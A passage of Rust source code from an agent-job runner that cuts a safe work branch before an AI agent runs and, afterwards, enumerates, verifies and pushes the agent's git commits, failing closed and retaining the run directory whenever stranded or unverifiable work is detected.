    /// AND remote-tracking refs (`refs/remotes/*`). A side branch whose tip is
    /// one of these introduced no post-provision commit (e.g. the agent checked
    /// out a remote-tracking branch, creating a local head that was never under
    /// `refs/heads/` at provision), so it can strand no work even though it is
    /// absent from `provision_tips`. `None` when the snapshot failed (shares the
    /// `provision_tips` enumeration) — finalize fails closed.
    pub provision_shas: Option<std::collections::BTreeSet<String>>,
}

/// The git-finalize outcome fed into the job's completion variables
/// (`branch`/`commits`/`pushed`/`pullRequest`) — the Node plugin's `gitResult`.
pub struct GitResult {
    pub branch: Option<String>,
    pub commits: Vec<String>,
    pub pushed: bool,
    pub pr: Option<serde_json::Value>,
    /// Set when finalize could not prove every agent commit is either pushed or
    /// accounted for — an enumeration step failed (fail-closed, never read as
    /// "no work"), or work was found stranded on a side branch / detached HEAD
    /// that is not being pushed. The caller must RETAIN the run dir: the only
    /// copy of that work may live in it, so reaping would destroy it.
    pub retain: bool,
    /// Set when finalize found real agent work, independent of whether it was
    /// pushed or even enumerated onto the work branch. Distinct from `retain`
    /// (which only marks an incomplete/stranded scan) and from `commits` (which
    /// the stranded-work paths deliberately CLEAR so a partial enumeration is
    /// not published): a quiet commit-only run that strands work on a side
    /// branch or a detached HEAD leaves the final HEAD unchanged and `commits`
    /// empty, so without this signal the empty-job detector would fail the run
    /// as "empty" and its retry would wipe the only copy. Feeds the caller's
    /// `has_commits`/empty detection.
    pub work_found: bool,
}

/// Longest segment `sanitize_branch_segment` leaves in a composed fallback ref.
///
/// A git ref is stored loose as a file per component, so each component must
/// fit the filesystem's `NAME_MAX` (255 on ext4/overlayfs/APFS). The composed
/// fallback is `nano/agent-work/<base>-<uniq>`: `agent-work` is 10 chars and
/// the per-activation `<uniq>` (`<pid>-<nanos>`) is ~25, so capping the
/// job-controlled `<base>` segment here keeps every component — and the whole
/// ref — comfortably inside the limit. Mirrors the plugin's
/// `sanitizeBranchSegment`, which likewise bounds its segment.
const MAX_FALLBACK_SEGMENT: usize = 200;

/// Keep only ref-safe characters in a branch segment and trim leading/trailing
/// separators so the composed `nano/agent-work/<base>-<uniq>` is always a valid
/// ref. Mirrors the plugin's `sanitizeBranchSegment`.
fn sanitize_branch_segment(s: &str) -> String {
    let mapped: String = s
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/') {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = mapped.trim_matches(|c| c == '/' || c == '-' || c == '.');
    if trimmed.is_empty() {
        "base".to_string()
    } else {
        trimmed.to_string()
    }
}

/// `sanitize_branch_segment` + a length cap, for the job-controlled base
/// segment of a fallback ref. A valid-but-long base name otherwise fits as the
/// cloned branch yet overflows once `-<uniq>` is appended: `checkout -B` then
/// fails on the over-long ref and finalize silently pushes nothing. Truncate on
/// a char boundary and re-trim any trailing separator the cut exposed.
fn bounded_fallback_segment(s: &str) -> String {
    let seg = sanitize_branch_segment(s);
    if seg.chars().count() <= MAX_FALLBACK_SEGMENT {
        return seg;
    }
    let cut: String = seg.chars().take(MAX_FALLBACK_SEGMENT).collect();
    let cut = cut.trim_end_matches(['/', '-', '.']);
    if cut.is_empty() {
        "base".to_string()
    } else {
        cut.to_string()
    }
}

/// Resolve the repository's shared DEFAULT branch — the ref `origin/HEAD` points
/// at — so finalize never keeps it as the work branch and pushes the agent's
/// commits straight onto it. Tries the local `refs/remotes/origin/HEAD` symref
/// first (set by an ordinary clone, offline and cheap); when a single-branch
/// clone left none, falls back to an authenticated `ls-remote --symref` against
/// the TRUSTED credential-free URL (secret delivered out of band, exactly like
/// the push), reading the `ref: refs/heads/<name>` line. Returns the short
/// branch name, or `None` when it cannot be determined (callers then rely on the
/// configured base / conventional defaults alone).
async fn resolve_remote_default_branch(
    workspace: &CwdHandle,
    repo: &Repository,
    timeout: Duration,
) -> Option<String> {
    // Local origin/HEAD: `symbolic-ref --short` prints e.g. `origin/develop`.
    if let Ok(s) = git(
        &[
            "symbolic-ref".into(),
            "--short".into(),
            "-q".into(),
            "refs/remotes/origin/HEAD".into(),
        ],
        Some(workspace),
        timeout,
        None,
    )
    .await
    {
        let trimmed = s.trim();
        let name = trimmed.strip_prefix("origin/").unwrap_or(trimmed).trim();
        if !name.is_empty() {
            return Some(name.to_string());
        }
    }
    // Fallback: ask the trusted remote. Isolated config + credential-free URL +
    // out-of-band helper credential, mirroring the finalize push, so a private
    // default still resolves and no secret reaches argv.
    let (fetch_url, cred) = trusted_fetch_source(&repo.url);
    let out = git_isolated(
        &[
            "ls-remote".into(),
            "--symref".into(),
            "--".into(),
            fetch_url,
            "HEAD".into(),
        ],
        Some(workspace),
        timeout,
        cred.as_ref(),
    )
    .await
    .ok()?;
    // A `ref: refs/heads/<name>\tHEAD` line names the default branch.
    for line in out.lines() {
        if let Some(rest) = line.trim().strip_prefix("ref:") {
            if let Some(name) = rest
                .split_whitespace()
                .next()
                .and_then(|r| r.strip_prefix("refs/heads/"))
            {
                if !name.is_empty() {
                    return Some(name.to_string());
                }
            }
        }
    }
    None
}

/// Cut the work branch the agent will commit onto, BEFORE it runs. Commits are
/// never made directly on a shared base (issue #231 / plugin `provisionRepo`):
/// when the clone landed on the base (an explicit `branch.create` naming it, a
/// conventional `main`/`master`, or the configured base), a uniquely-named
/// `nano/agent-work/<base>-<uniq>` fallback is checked out instead; an explicit
/// non-base `branch.create` is honoured; a non-base PR-head checkout stays put
/// so finalize advances the PR head. A DETACHED provision (a pinned
/// `repository.sha`/tag, which `provision` checks out with `--detach`) names no
/// branch, so a push-enabled run cuts a `nano/agent-work/<base>-<uniq>` fallback
/// from the detached HEAD as well — otherwise `working_branch` would stay `None`
/// and finalize would have nothing to push, silently stranding the agent's
/// commits. A read-only (`branch.push = false`) detached provision cuts nothing.
///
/// Best-effort: provisioning already succeeded, so a branch-cut failure here is
/// logged and leaves `working_branch = None` (finalize pushes nothing) rather
/// than failing the job.
pub async fn prepare_work_branch(
    workspace: &CwdHandle,
    repo: &Repository,
    branch_base: Option<&str>,
    branch_create: Option<&str>,
    want_push: bool,
    uniq: &str,
    timeout: Duration,
) -> GitPrep {
    // Read the SYMBOLIC ref, not `rev-parse --abbrev-ref HEAD`: the latter
    // resolves HEAD to a commit and so exits nonzero on an empty/unborn
    // repository (a symbolic branch with no commit yet), leaving `checked_out`
    // `None` and the agent's first commit unpushed. `symbolic-ref --short HEAD`
    // prints the branch HEAD points at whether or not it has a commit, and still
    // fails on a detached HEAD (which we treat as "no branch", same as before).
    let checked_out = git(
        &["symbolic-ref".into(), "--short".into(), "-q".into(), "HEAD".into()],
        Some(workspace),
        timeout,
        None,
    )
    .await
    .ok()
    .map(|s| s.trim().to_string())
    .filter(|s| !s.is_empty() && s != "HEAD");
    let start_sha = git(
        &["rev-parse".into(), "HEAD".into()],
        Some(workspace),
        timeout,
        None,
    )
    .await
    .ok()
    .map(|s| s.trim().to_string())
    .filter(|s| !s.is_empty());

    // Snapshot every ref tip at provision time, so finalize can tell a branch
    // the agent CREATED (or advanced) after provisioning from one that merely
    // pre-existed. `start_sha..ref` alone cannot make that distinction: it only
    // proves `ref` diverges from the initial work-branch tip, so a pre-existing
    // branch the agent simply checked out (whose own divergent history satisfies
    // `start_sha..ref`) would be misclassified as agent-made and its pre-existing
    // commits condemned as stranded.
    //
    // Two views come out of ONE enumeration:
    //  * `provision_tips` (local `refs/heads/` short-name -> sha) detects a
    //    snapshotted local branch the agent ADVANCED.
    //  * `provision_shas` (every tip SHA: local heads, `refs/remotes/*`, AND
    //    `refs/tags/*`) detects a branch whose tip is a commit that already
    //    existed at provision — e.g. the agent checked out a remote-tracking
    //    branch, creating a local head absent from `refs/heads/` at provision.
    //    Such a branch introduces no new commit, so it strands nothing even
    //    though it is not in `provision_tips`. Without the remote tips it would
    //    be misclassified as agent-created and its pre-existing commits
    //    condemned. Tag tips are included so the non-head-ref finalize net does
    //    not misclassify a pre-existing tag's commit as stranded agent work.
    //
    // Read via `git_untruncated`: a ref listing larger than the captured stdout
    // tail would silently drop leading refs, so a truncated enumeration fails
    // closed (both views `None`) rather than yield a partial snapshot. `None`
    // for either means finalize cannot prove side branches pre-existed and fails
    // closed (retains the run dir).
    let (provision_tips, provision_shas): (
        Option<std::collections::BTreeMap<String, String>>,
        Option<std::collections::BTreeSet<String>>,
    ) = match git_untruncated(
        &[
            "for-each-ref".into(),
            "--format=%(refname) %(objectname)".into(),
            "refs/heads/".into(),
            "refs/remotes/".into(),
            "refs/tags/".into(),
        ],
        Some(workspace),
        timeout,
        None,
    )
    .await
    {
        Ok(list) => {
            let mut tips = std::collections::BTreeMap::new();
            let mut shas = std::collections::BTreeSet::new();
            for line in list.lines().map(str::trim).filter(|l| !l.is_empty()) {
                if let Some((refname, sha)) = line.split_once(' ') {
                    shas.insert(sha.to_string());
                    if let Some(short) = refname.strip_prefix("refs/heads/") {
                        tips.insert(short.to_string(), sha.to_string());
                    }
                }
            }
            (Some(tips), Some(shas))
        }
        Err(e) => {
            log(&format!(
                "provision: could not snapshot pre-existing ref tips — {e}; finalize will \
                 treat the side-branch scan as unverifiable and retain the run dir"
            ));
            (None, None)
        }
    };

    // Resolve the base branch independently of the checkout. Falling back to
    // `checked_out` here would make a provisioned `repository.ref = "feat/x"`
    // with no explicit base its own "base": `create_names_base("feat/x")` would
    // then be trivially true and the PR head would be diverted onto a fallback
    // branch instead of being advanced. Only the configured base
    // (`branch.base`/`repository.base_ref`) or a conventional default names the
    // shared base; the checkout's own position never does.
    let configured_base = branch_base
        .map(str::to_string)
        .or_else(|| repo.base_ref.clone());
    // Also treat the repository's SHARED DEFAULT branch as a base, even when it
    // is neither `main`/`master` nor the explicitly-configured base. A clone
    // that landed on a custom default (e.g. `develop`) would otherwise be
    // classified as a non-base PR head, so finalize would keep it as the work
    // branch and push the agent's commits straight onto the shared default — the
    // exact branch-cut hazard this guard exists to prevent. Resolve the default
    // from the local `origin/HEAD` symref, with an authenticated
    // `ls-remote --symref` fallback for the single-branch clones that leave none.
    let remote_default = resolve_remote_default_branch(workspace, repo, timeout).await;
    let create_names_base = |name: &str| -> bool {
        // Case-insensitive: git branch names are case-sensitive on disk, but a
        // configured base of `Main` and a checkout on `main` (or vice versa)
        // still name the SAME shared base — a case-sensitive compare would let
        // finalize push the agent's commits straight onto it (issue #231). The
        // resolved remote default is compared the same way, for the same reason.
        configured_base
            .as_deref()
            .is_some_and(|b| b.eq_ignore_ascii_case(name))
            || remote_default
                .as_deref()
                .is_some_and(|d| d.eq_ignore_ascii_case(name))
            || CONVENTIONAL_BASE
                .iter()
                .any(|b| b.eq_ignore_ascii_case(name))
    };
    let cut_fallback = |seg: &str| -> String {
        format!(
            "nano/agent-work/{}-{}",
            bounded_fallback_segment(seg),
            sanitize_branch_segment(uniq)
        )
    };
    let checkout = |branch: String| async move {
        // Defence in depth: the composed/candidate name must be a valid ref
        // before the branch cut creates it. An explicit `branch.create` is
        // already validated above, but the fallback path composes a name from a
        // job-controlled base; re-checking here means an over-long or malformed
        // composition is reported (and leaves `working_branch = None`) instead
        // of surfacing only as an opaque checkout failure after the agent ran.
        git(
            &["check-ref-format".into(), "--branch".into(), branch.clone()],
            Some(workspace),
            timeout,
            None,
        )
        .await
        .map_err(|e| {
            anyhow::anyhow!("refusing to check out invalid branch name {branch:?}: {e}")
        })?;
        // `git switch -C` takes ONLY a branch name (no pathspec positional), so
        // there is no branch/path ambiguity to fence with `--`; the name is
        // validated as a ref by the `check-ref-format` guard above, and `switch`
        // itself rejects an invalid (e.g. leading-dash) name rather than
        // misreading it as an option the way `checkout` could.
        git(
            &["switch".into(), "-C".into(), branch.clone()],
            Some(workspace),
            timeout,
            None,
        )
        .await
        .map(|_| branch)
    };

    let mut working_branch: Option<String> = None;
    if let Some(create) = branch_create.filter(|c| !c.is_empty()) {
        // The explicit create name is job-controlled; validate it as a real
        // branch name before honouring it. An invalid name (e.g. one with a
        // slash-suffixed component that collides with an existing `feat` branch
        // on retry) would otherwise fail the checkout below and be swallowed
        // into `working_branch = None` — the job then completes with
        // `pushed = false` and the agent's commits stranded in the run dir.
        let valid = git(
            &[
                "check-ref-format".into(),
                "--branch".into(),
                create.to_string(),
            ],
            Some(workspace),
            timeout,
            None,
        )
        .await
        .is_ok();
        if !valid {
            log(&format!(
                "finalize: ignoring invalid branch.create {create:?} (failed git check-ref-format) \
                 — the agent's commits stay on the current checkout and are not pushed"
            ));
        }
        let target = if !valid {
            None
        } else if want_push && create_names_base(create) {
            // An explicit create that NAMES the base would commit directly on a
            // shared base — cut a fallback instead.
            Some(cut_fallback(configured_base.as_deref().unwrap_or(create)))
        } else {
            Some(create.to_string())
        };
        if let Some(target) = target {
            match checkout(target).await {
                Ok(b) => working_branch = Some(b),
                Err(e) => log(&format!("finalize: branch cut failed — {e}")),
            }
        }
    } else if let Some(co) = checked_out.clone() {
        // Preserve the checked-out branch as the work branch REGARDLESS of push
        // eligibility. Commit discovery and the side-branch sweep key off
        // `working_branch`: leaving it `None` on a no-push run (`branch.push =
        // false`, no `branch.create`) that committed on its own checkout would
        // make the sweep treat that checkout as a stranded side branch, clear
        // its commit list, and drop `branch`/`commits` from the completion
        // variables. Only the fallback cut (off a shared base) and the eventual
        // push depend on `want_push`; anchoring the enumeration does not.
        let target = if want_push && create_names_base(&co) {
            cut_fallback(configured_base.as_deref().unwrap_or(&co))
        } else {
            co
        };
        match checkout(target).await {
            Ok(b) => working_branch = Some(b),
            Err(e) => log(&format!("finalize: branch cut failed — {e}")),
        }
    } else if want_push {
        // Detached HEAD (a pinned `repository.sha`/tag, provisioned with
        // `checkout --detach`) with no explicit `branch.create`: `symbolic-ref`
        // yielded no branch, so `checked_out` is `None`. Without a fallback cut
        // `working_branch` would stay `None` and a push-enabled run would have
        // nothing to push — finalize would report `branch: null`/`pushed: false`
        // and strand the agent's commits on the detached HEAD. Cut a fallback
        // branch FROM the detached HEAD (`checkout -B` moves the new branch to
        // the current commit) so the agent commits on it and finalize publishes
        // it. A read-only run (`want_push = false`) skips this: there is nothing
        // to push, and the side-branch/reflog/non-head nets still protect any
        // commit the agent leaves on the detached HEAD.
        let target = cut_fallback(configured_base.as_deref().unwrap_or("detached"));
        match checkout(target).await {
            Ok(b) => working_branch = Some(b),
            Err(e) => log(&format!("finalize: detached-HEAD fallback branch cut failed — {e}")),
        }
    }

    GitPrep {
        working_branch,
        want_push,
        start_sha,
        provision_tips,
        provision_shas,
    }
}

/// After the agent runs: enumerate the commits it made on the work branch and
/// (when `branch.push` is on and the branch has new commits) push it to the
/// origin, returning the `branch`/`commits`/`pushed`/`pr` the job's completion
/// variables carry. Mirrors the plugin's `finalizeGit`. Best-effort: a push
/// failure is reported as `pushed = false` (the run dir is then retained for
/// recovery by the caller) rather than failing the job.
pub async fn finalize_git(
    workspace: &CwdHandle,
    prep: &GitPrep,
    repo: &Repository,
    timeout: Duration,
) -> GitResult {
    let mut out = GitResult {
        branch: prep.working_branch.clone(),
        commits: Vec::new(),
        pushed: false,
        pr: None,
        retain: false,
        work_found: false,
    };

    // Commit discovery is anchored to the PREPARED work branch, not to wherever
    // the agent left `HEAD`. If the agent checked out another branch and
    // committed there, a `HEAD`-anchored enumeration would report those SHAs
    // while the push below moves the unchanged `working_branch` — a push that
    // can succeed, set `pushed = true`, and let the run dir be reaped with the
    // only copy of the real work. Enumerate `working_branch` explicitly, and
    // treat the branch ref (not the checkout position) as the source of truth.
    //
    // FAIL CLOSED: a failed `rev-parse`/`rev-list` here means the scan is
    // INCOMPLETE, never "no work". Set `retain` so the run dir is kept — a
    // corrupt or agent-controlled graph must not read as a clean, reappable
    // checkout that still holds unpublished commits.
    let branch_tip = match &prep.working_branch {
        Some(branch) => match git(
            &["rev-parse".into(), "--verify".into(), branch.clone()],
            Some(workspace),
            timeout,
            None,
        )
        .await
        {
            Ok(s) => {
                let s = s.trim().to_string();
                if s.is_empty() {
                    log(&format!(
                        "finalize: rev-parse of work branch {branch:?} returned empty — treating \
                         the scan as incomplete and retaining the run dir"
                    ));
                    out.retain = true;
                    None
                } else {
                    Some(s)
                }
            }
            Err(e) => {
                log(&format!(
                    "finalize: rev-parse of work branch {branch:?} failed — {e}; treating the \
                     scan as incomplete and retaining the run dir"
                ));
                out.retain = true;
                None
            }
        },
        // No prepared branch (detached HEAD / push disabled): fall back to HEAD.
        None => match git(
            &["rev-parse".into(), "HEAD".into()],
            Some(workspace),
            timeout,
            None,
        )
        .await
        {
            Ok(s) => {
                let s = s.trim().to_string();
                if s.is_empty() {
                    out.retain = true;
                    None
                } else {
                    Some(s)
                }
            }
            Err(e) => {
                log(&format!(
                    "finalize: rev-parse HEAD failed — {e}; treating the scan as incomplete and \
                     retaining the run dir"
                ));
                out.retain = true;
                None
            }
        },
    };
    let range = match (&prep.start_sha, &branch_tip) {
        (Some(start), Some(tip)) => Some(format!("{start}..{tip}")),
        // Empty/unborn base: every commit now on the branch is new work.
        (None, Some(tip)) => Some(tip.clone()),
        _ => None,
    };
    if let Some(range) = range {
        match git(
            &["rev-list".into(), range.clone()],
            Some(workspace),
            timeout,
            None,
        )
        .await
        {
            Ok(listed) => {
                out.commits = listed
                    .lines()
                    .map(str::trim)
                    .filter(|l| !l.is_empty())
                    .map(str::to_string)
                    .collect();
                if !out.commits.is_empty() {
                    out.work_found = true;
                }
                // `git()` retains only a bounded TAIL of a child's stdout
                // (`GIT_STDOUT_TAIL`), and `rev-list` prints newest-first, so a
                // pathological graph can silently drop the NEWEST tips from the
                // captured list — the parsed commits would then be an
                // oldest-only subset masquerading as the complete set. Guard
                // with the authoritative `--count` (a single small integer that
                // never truncates): if more commits exist than we parsed, the
                // enumeration is incomplete, so fail closed and retain rather
                // than report a partial list as the whole of the agent's work.
                match git(
                    &["rev-list".into(), "--count".into(), range],
                    Some(workspace),
                    timeout,
                    None,
                )
                .await
                {
                    Ok(c) => match c.trim().parse::<usize>() {
                        Ok(n) if n > out.commits.len() => {
                            log(&format!(
                                "finalize: rev-list output was truncated ({} of {n} commits \
                                 captured); treating the scan as incomplete and retaining the run \
                                 dir rather than trusting the partial list",
                                out.commits.len()
                            ));
                            out.retain = true;
                            // Drop the oldest-only partial tail: a truncated list
                            // must never be emitted as the complete `commits`
                            // completion variable. `work_found` stays set so the
                            // run still counts as non-empty.
                            out.commits.clear();
                        }
                        Ok(_) => {}
                        Err(e) => {
                            log(&format!(
                                "finalize: rev-list --count returned an unparseable value ({e}); \
                                 treating the scan as incomplete and retaining the run dir"
                            ));
                            out.retain = true;
                            out.commits.clear();
                        }
                    },
                    Err(e) => {
                        log(&format!(
                            "finalize: rev-list --count of the work branch failed — {e}; treating \
                             the scan as incomplete and retaining the run dir"
                        ));
                        out.retain = true;
                        out.commits.clear();
                    }
                }
            }
            Err(e) => {
                // A failed/timed-out enumeration must never be read as "no
                // unpublished commits" — fail closed and retain.
                log(&format!(
                    "finalize: rev-list of the work branch failed — {e}; treating the scan as \
                     incomplete and retaining the run dir"
                ));
                out.retain = true;
            }
        }
    }

    // Off-branch safety net: if the agent committed on a ref OTHER than the
    // prepared work branch, those commits are not in `out.commits` and will not
    // be pushed. Leaving `pushed`/`commits` to look clean would let the run dir
    // be reaped with the only copy of that work, so surface it instead: report
    // no push and log the stranded ref(s) for recovery.
    //
    // Only refs created AFTER provisioning can carry agent work the branch-cut
    // did not account for. The local base branch (e.g. `main`) pre-exists and
    // is routinely "ahead" of a fresh fallback work branch (the agent's commit
    // is on the fallback, not the base), so a bare `work..ref` count would
    // condemn every fallback run. Restrict the sweep to branches whose tip is
    // itself a post-provisioning commit (`start_sha..ref` non-empty) — i.e.
    // branches the agent created and committed on. On an empty/unborn base (no
    // `start_sha`) every commit on a side branch is post-provisioning work, so
    // the sweep still runs (any commit on `ref` counts).
    //
    // Run this scan even when there is NO prepared work branch (`working_branch`
    // is `None` — the normal `branch.push = false` read-only path, or a detached
    // checkout). A `None` branch is only "nothing to PUSH", not "nothing to
    // protect": if the agent commits on a side branch and switches back, the
    // final HEAD is unchanged and the reflog net below skips the commit (a local
    // branch contains it), so without this sweep `retain` stays false and the
    // only copy is reaped (or the run is misread as empty and wiped on retry).
    {
        match git(
            &[
                "for-each-ref".into(),
                "--format=%(refname:short)".into(),
                "refs/heads/".into(),
            ],
            Some(workspace),
            timeout,
            None,
        )
        .await
        {
            Ok(refs) => {
                let refs: Vec<&str> = refs.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
                // `git()` keeps only a bounded TAIL of stdout (`GIT_STDOUT_TAIL`),
                // so a repo with enough refs silently drops the FIRST lines here —
                // exactly the older side branches an agent's stranded work would
                // hide on. Prove the enumeration is COMPLETE rather than trust the
                // tail. `for-each-ref` sorts by refname and the tail keeps the LAST
                // lines, so:
                //   * anchoring on the CHECKED-OUT branch (the prior guard) only
                //     proves THAT branch survived — it sorts late (e.g. the prepared
                //     `nano/agent-work/...` fallback), so an early-sorting stranded
                //     branch is dropped while the cross-check still passes; and
                //   * checking only the LAST parsed branch's successor misses a tail
                //     that dropped LEADING refs while keeping the true maximum.
                // There is no cheap total-count for `for-each-ref`, so anchor BOTH
                // ends of the sorted listing with two independent, truncation-immune
                // O(1) probes (each returns at most one short line, which can never
                // fill the tail):
                //   * FIRST: the global minimum branch is `for-each-ref --count=1
                //     refs/heads/`'s single line. The parsed first branch MUST equal
                //     it; if it does not, leading refs were dropped from the tail.
                //   * LAST: the parsed last branch `z` is the maximum iff NO branch
                //     sorts after it. Take the global maximum directly with a
                //     reverse sort capped at one line (`--sort=-refname --count=1
                //     refs/heads/`): one short line that can never fill the tail,
                //     and it must equal the parsed last branch. If it differs,
                //     trailing refs were dropped from the forward-sorted tail.
                // Together these prove the parsed list is exactly the sorted set of
                // branches: it starts at the true minimum, ends at the true maximum,
                // and (being a contiguous sorted tail) contains everything between.
                let min_branch = match git(
                    &[
                        "for-each-ref".into(),
                        "--count=1".into(),
                        "--format=%(refname:short)".into(),
                        "refs/heads/".into(),
                    ],
                    Some(workspace),
                    timeout,
                    None,
                )
                .await
                {
                    Ok(p) => {
                        let p = p.trim();
                        if p.is_empty() {
                            None
                        } else {
                            Some(p.to_string())
                        }
                    }
                    Err(e) => {
                        log(&format!(
                            "finalize: side-branch minimum probe failed — {e}; treating the \
                             scan as incomplete and retaining the run dir"
                        ));
                        out.retain = true;
                        None
                    }
                };
                match (refs.first(), &min_branch) {
                    // The listing parsed nothing. A healthy finalize always has at
                    // least the prepared work branch and/or the local base, so an
                    // empty parse is an incomplete scan regardless of the probe:
                    // fail closed and retain rather than sweep an empty list.
                    (None, _) => {
                        log(
                            "finalize: side-branch enumeration parsed no branches; treating the \
                             scan as incomplete and retaining the run dir rather than trusting \
                             the empty list",
                        );
                        out.retain = true;
                    }
                    // The probe failed (retain already set): nothing more to prove.
                    (_, None) => {}
                    // Leading refs were dropped: the parsed first branch is not the
                    // true minimum.
                    (Some(first), Some(min)) if *first != min => {
                        log(&format!(
                            "finalize: side-branch enumeration begins at {first:?} but the true \
                             first branch is {min:?} (stdout tail truncation dropped leading \
                             refs); treating the scan as incomplete and retaining the run dir \
                             rather than trusting the partial list"
                        ));
                        out.retain = true;
                    }
                    (Some(_), Some(_)) => {}
                }
                // Anchor the LAST end: the parsed last branch must equal the TRUE
                // maximum `refs/heads/` ref.
                if let Some(last) = refs.last() {
                    match git(
                        &[
                            "for-each-ref".into(),
                            "--count=1".into(),
                            "--sort=-refname".into(),
                            "--format=%(refname:short)".into(),
                            "refs/heads/".into(),
                        ],
                        Some(workspace),
                        timeout,
                        None,
                    )
                    .await
                    {
                        Ok(max) => {
                            let max = max.trim();
                            if !max.is_empty() && max != *last {
                                log(&format!(
                                    "finalize: side-branch enumeration ended at {last:?} but the \
                                     true last branch is {max:?} (stdout tail truncation dropped \
                                     refs); treating the scan as incomplete and retaining the \
                                     run dir rather than trusting the partial list"
                                ));
                                out.retain = true;
                            }
                        }
                        Err(e) => {
                            log(&format!(
                                "finalize: side-branch maximum probe failed — {e}; treating \
                                 the scan as incomplete and retaining the run dir"
                            ));
                            out.retain = true;
                        }
                    }
                }
                // Stop here once the enumeration is known INCOMPLETE. The 1 MiB
                // stdout tail still permits tens of thousands of short refs, and
                // the per-branch loop below launches serial Git processes for
                // each — so scanning a retained (already-doomed) partial list
                // would let an agent keep finalize running for an extremely long
                // time outside its own run timeout. The partial list proves
                // nothing (any subset may be missing), so retain and return
                // instead of sweeping it.
                if out.retain {
                    log(
                        "finalize: side-branch enumeration is incomplete; skipping the per-branch \
                         reachability scan and retaining the run dir",
                    );
                    return out;
                }
                // Bound the per-branch reachability scan even when the listing
                // IS complete: each branch costs serial `rev-parse`/`rev-list`
                // processes, and the 1 MiB tail still permits tens of thousands
                // of refs, so an agent-manufactured branch set could stall
                // finalize far past its run timeout. A real run has a handful
                // of branches; past the cap, fail closed and retain rather than
                // sweep an unbounded set.
                if refs.len() > MAX_SIDE_BRANCH_SCAN {
                    log(&format!(
                        "finalize: {} side branches exceed the scan cap of {MAX_SIDE_BRANCH_SCAN}; \
                         treating the scan as unbounded and retaining the run dir rather than \
                         running an unbounded per-branch reachability sweep",
                        refs.len()
                    ));
                    out.retain = true;
                    return out;
                }
                for r in refs {
                    if prep.working_branch.as_deref() == Some(r) {
                        continue;
                    }
                    // Classify against the PROVISION-TIME snapshot, not
                    // `start_sha..ref` alone: that range only proves `ref`
                    // diverges from the initial work-branch tip, so a branch
                    // that PRE-EXISTED provisioning (e.g. a remote branch the
                    // agent merely checked out, whose own divergent history
                    // satisfies `start_sha..ref`) would be misclassified as
                    // agent-made and its pre-existing commits condemned as
                    // stranded. A branch is agent work only when the snapshot
                    // proves it is NEW or ADVANCED past its provision-time tip.
                    //
                    // FAIL CLOSED: when the snapshot is absent (its enumeration
                    // failed at provision time) finalize cannot prove any side
                    // branch pre-existed, so it cannot clear the stranded-work
                    // radar — treat the scan as incomplete and retain rather
                    // than risk reaping the only copy of a misclassified branch.
                    let new_tip = match git(
                        &[
                            "rev-parse".into(),
                            "--verify".into(),
                            format!("refs/heads/{r}"),
                        ],
                        Some(workspace),
                        timeout,
                        None,
                    )
                    .await
                    {
                        Ok(s) => s.trim().to_string(),
                        Err(e) => {
                            log(&format!(
                                "finalize: resolving side branch {r:?}'s tip failed — {e}; \
                                 treating the scan as incomplete and retaining the run dir"
                            ));
                            out.retain = true;
                            // STOP on the first INCONCLUSIVE branch: `retain` is
                            // now set, so no push can happen regardless of the
                            // remaining branches, and continuing would relaunch a
                            // serial `rev-parse`/`rev-list` per branch — up to
                            // `MAX_SIDE_BRANCH_SCAN` × the per-command timeout of
                            // wall-clock (hours) that an agent-controlled graph
                            // could deliberately stall. Return the retained
                            // result instead of sweeping a doomed list.
                            return out;
                        }
                    };
                    let agent_created = match (&prep.provision_tips, &prep.provision_shas) {
                        (Some(tips), Some(shas)) => match tips.get(r) {
                            // A snapshotted local branch is agent work only if
                            // the agent ADVANCED its tip past the provision-time
                            // commit; an unchanged tip is pre-existing history.
                            Some(old) => *old != new_tip,
                            // Absent from the local-head snapshot. It still
                            // PRE-EXISTED if its tip is a commit that was already
                            // a ref tip at provision time (local OR remote-
                            // tracking) — e.g. the agent checked out a
                            // remote-tracking branch, creating a local head Git
                            // never recorded under refs/heads/ at provision. Only
                            // a tip that is a NEW post-provision commit (reachable
                            // from no provision-time ref tip) is agent work.
                            None => !shas.contains(&new_tip),
                        },
                        // Snapshot absent (its enumeration failed/truncated at
                        // provision): cannot prove side branches pre-existed, so
                        // treat the scan as incomplete and fail closed.
                        _ => {
                            log(
                                "finalize: no provision-time ref snapshot (its enumeration \
                                 failed); cannot prove side branches pre-existed, so treating the \
                                 scan as incomplete and retaining the run dir",
                            );
                            out.retain = true;
                            // The snapshot is a WHOLE-SCAN condition (absent for
                            // every branch), so no later branch can clear it —
                            // stop now rather than re-log and re-probe the entire
                            // list.
                            return out;
                        }
                    };
                    if !agent_created {
                        continue;
                    }
                    // "Unpublished" = commits on the side branch that are NOT on
                    // the branch finalize will push. With a prepared work branch
                    // that is `work..ref`; with none (push disabled / detached)
                    // there is no push destination at all, so EVERY commit on an
                    // agent-created side branch is unpublished — use `ref` alone
                    // (counting it against the pre-existing base would wrongly
                    // excuse a side branch that shares history with `main`).
                    let unpublished_range = match &prep.working_branch {
                        Some(branch) => format!("{branch}..{r}"),
                        None => r.to_string(),
                    };
                    let unpublished = match git(
                        &["rev-list".into(), "--count".into(), unpublished_range],
                        Some(workspace),
                        timeout,
                        None,
                    )
                    .await
                    {
                        Ok(c) => match c.trim().parse::<u64>() {
                            Ok(n) => n,
                            Err(_) => {
                                log(&format!(
                                    "finalize: unparseable unpublished-commit count for side \
                                     branch {r:?}; treating the scan as incomplete and retaining \
                                     the run dir"
                                ));
                                out.retain = true;
                                // Inconclusive: stop the scan (see above) rather
                                // than keep probing the rest of the list.
                                return out;
                            }
                        },
                        Err(e) => {
                            log(&format!(
                                "finalize: counting unpublished commits on side branch {r:?} \
                                 failed — {e}; treating the scan as incomplete and retaining the \
                                 run dir"
                            ));
                            out.retain = true;
                            // Inconclusive (a failed/stalled `rev-list`): stop the
                            // scan rather than let a stalling graph multiply the
                            // per-command timeout across every remaining branch.
                            return out;
                        }
                    };
                    if unpublished > 0 {
                        log(&format!(
                            "finalize: {unpublished} commit(s) on side branch {r:?} are not on \
                             the pushed work branch {:?}; leaving them unpublished (run dir \
                             retained) so the only copy is not reaped",
                            prep.working_branch.as_deref()
                        ));
                        // Force the caller to retain the run dir: report no push.
                        // Record that real work EXISTS independently of the
                        // cleared `commits`/`retain`, so the empty-job detector
                        // does not fail this quiet committing run as "empty" and
                        // wipe the only copy on retry.
                        out.pushed = false;
                        out.commits.clear();
                        out.retain = true;
                        out.work_found = true;
                        return out;
